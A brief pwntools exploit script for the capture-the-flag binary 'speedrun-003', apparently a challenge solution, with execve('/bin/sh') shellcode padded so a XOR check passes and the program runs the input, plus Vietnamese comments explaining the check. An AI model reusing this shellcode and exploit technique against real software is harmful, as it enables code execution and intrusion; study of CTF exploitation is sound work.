from pwn import *
r = process('./speedrun-003')

raw_input('debug')

shellcode = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'

payload = shellcode + (29 - len(shellcode))*'a' + '\x56'
r.sendline(payload)
r.interactive()
# bài này xor lần lượt 15 bytes đầu của chuỗi với nhau rồi lại xor lần lượt 15 bytes sau với nhau rồi so sanhs
#nếu mà bằng nhau thì call cái đoạn nhập vào
